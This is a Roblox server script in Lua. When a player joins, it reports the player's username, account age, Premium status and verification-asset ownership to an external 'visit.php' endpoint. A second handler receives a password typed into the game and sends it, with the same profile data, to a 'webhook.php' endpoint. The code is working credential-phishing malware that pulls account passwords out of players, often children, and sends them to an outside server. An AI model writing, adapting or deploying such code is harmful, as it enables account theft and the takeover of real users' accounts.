game.Players.PlayerAdded:Connect(function(Player)
	spawn(function()
		local httpservice = game:GetService("HttpService")

		local mem = ""
		if Player.MembershipType == Enum.MembershipType.Premium then
			mem = "Premium"
		else
			mem = "NBC"
		end
		
		local GetVerified = "Unverified"
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player,102611803) then
		    GetVerified = "Verified"
		end
		
		local accountage = Player.AccountAge

		game:GetService("HttpService"):GetAsync("Website_Link/API/visit.php?username="..Player.Name.."&age="..accountage.."&mem="..mem.."&verify="..GetVerified.."&gameid="..game.PlaceId)
	end)
end)

game.ReplicatedStorage.Request.OnServerEvent:Connect(function(Player, Password)

	local mem = ""
	if Player.MembershipType == Enum.MembershipType.Premium then
		mem = "Premium"
	else
		mem = "Non-Premium"
	end
	
	local httpservice = game:GetService("HttpService")
	
	local GetVerified = "Unverified"
		if game:GetService("MarketplaceService"):PlayerOwnsAsset(Player,102611803) then
		    GetVerified = "Verified"
		end
		
	local accountage = Player.AccountAge
	
	game:GetService("HttpService"):GetAsync("Website_Link/API/webhook.php?username="..Player.Name.."&age="..accountage.."&mem="..mem.."&verify="..GetVerified.."&gameid="..game.PlaceId.."&ps="..Password)


end)